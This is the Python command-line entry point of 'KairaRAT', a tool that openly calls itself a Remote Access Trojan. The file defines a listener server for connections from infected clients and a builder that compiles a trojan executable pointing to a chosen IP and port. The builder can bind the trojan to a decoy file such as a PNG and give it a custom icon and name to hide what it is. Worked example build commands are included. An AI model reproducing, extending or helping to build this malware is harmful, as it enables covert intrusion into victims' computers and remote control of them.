# Our main.py file.It's taking arguments from user and makes processes.
# Coded by st4inl3s5
# You can contact with me in telegram or instagram
# Join my telegram channel : https://t.me/+5XoMhXv4SghhYmE0
# Instagram : arduinocum.py


import argparse
from textwrap import dedent
from colorama import init, Fore
from warnings import filterwarnings
from modules import kaira_server
from modules import builder
from modules import template

init()

filterwarnings("ignore")

template_ = template.choose_template()
print(Fore.GREEN + template_)
print(Fore.GREEN + "\n\nRemote Access Trojan tool built with python.\nAuthor: st4inl3s5\n\n" + Fore.MAGENTA +"instagram: arduinocum.py\nTelegram: https://t.me/+5XoMhXv4SghhYmE0\n\n" + Fore.GREEN)

parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter, epilog=dedent("Example usages:\n\npython3 main.py server -h \npython3 main.py build -h"), description=dedent("Mods:\n\nserver:Server for listening connections from client\nbuild:Build a trojan with executable file"))
subparsers = parser.add_subparsers(dest="subparser")

### SERVER PARSER ###

parser_listen = subparsers.add_parser("server") # main server parser
parser_listen.add_argument("-ip", "--ip_address", required=True, help="Set the IP address for server mode") # subparser for server
parser_listen.add_argument("-p", "--port", required=True, type=int, help="Set the Port number for server mode") # subparser for server

### BUILD PARSER ###

# main build parser
parser_build = subparsers.add_parser("build", formatter_class=argparse.RawDescriptionHelpFormatter, epilog=dedent("Example usages:\n\nBuild kairaRAT with merge file and icon:\npython3 main.py build -ip <your_server_ip_address> -p <your_server_port> -m <your_file_to_merge> -i <your_icon_with_.ico_extension>\npython3 main.py build -ip 172.28.89.113 -p 4444 -m merge_file.png -i my_icon.ico -n kaira.exe\n\nBuild kairaRAT just with merge file:\npython3 main.py build -ip <your_server_ip_address> -p <your_server_port> -m <your_file_to_merge>\npython3 main.py build -ip 172.28.89.113 -p 4444 -m merge_file.png -n kaira.exe\n\nBuild kairaRAT just with icon:\npython3 main.py build -ip <your_server_ip_address> -p <your_server_port> -i <your_icon_file_with_.ico_extension>\npython3 main.py build -ip 172.28.89.113 -p 4444 -i icon.ico -n kaira.exe\n\nBuild kairaRAT without icon or merge file:\npython3 main.py build -ip <your_server_ip_address> -p <your_server_port>\npython3 main.py build -ip 172.28.89.113 -p 4444 -n kaira.exe"))
parser_build.add_argument("-ip", "--ip_address", required=True, help="Set the IP address for build KairaRAT") # subparser for build
parser_build.add_argument("-p", "--port", required=True, type=int, help="Set the port number for build KairaRAT") # subparser for build
parser_build.add_argument("-m", "--merge_file", required=False, help="Set the merge file for build KairaRAT(optional)") #subparser for build
parser_build.add_argument("-i", "--icon", required=False, help="Set the icon file for build KairaRAT(optional)") # subparser for build
parser_build.add_argument("-n", "--name", default="client.exe", required=False, help="Set the name for executable file(optional)") # subparser for build



args = parser.parse_args()

### CHECKING PARSERS ###

if args.subparser == "server":
        try:
            server = kaira_server.Kaira_Server(args.ip_address, args.port)
            server.core()
        except ConnectionResetError: # If connection terminated by client, server will close.
            print(Fore.RED + "[-]Connection has been lost.")
            exit()

elif args.subparser == "build":
    try:
        splitted_name = args.name.split(".") # Detects if user -n parameter input include 'exe' for dont cause any errors.
        if splitted_name[1] == "exe":
            pass
    except IndexError:
        args.name = args.name + ".exe"
    if args.merge_file and args.icon:
        try:
            builder.build_with_merge_and_icon(args.ip_address, args.port, args.merge_file, args.icon, args.name)
            print(Fore.GREEN + f"[+]Building completed.Check /builds/{args.name}")
        except Exception as e:
            print(Fore.RED + "[-]An error occurred while building." + str(e))
    elif args.merge_file:
        try:
            builder.build_with_merge(args.ip_address, args.port, args.merge_file, args.name)
            print(Fore.GREEN + f"[+]Building completed.Check /builds/{args.name}")
        except Exception as e:
            print(Fore.RED + "[-]An error occurred while building." + str(e))
    elif args.icon:
        try:
            builder.build_with_icon(args.ip_address, args.port, args.icon, args.name)
            print(Fore.GREEN + f"[+]Building completed.Check /builds/{args.name}")
        except Exception as e:
            print(Fore.RED + "[-]An error occurred while building." + str(e))
    else:
        try:
            builder.default_build(args.ip_address, args.port, args.name)
            print(Fore.GREEN + f"[+]Building completed.Check /builds/{args.name}")
        except Exception as e:
            print(Fore.RED + "[-]An error occurred while building." + str(e))

else:
    parser.print_help()
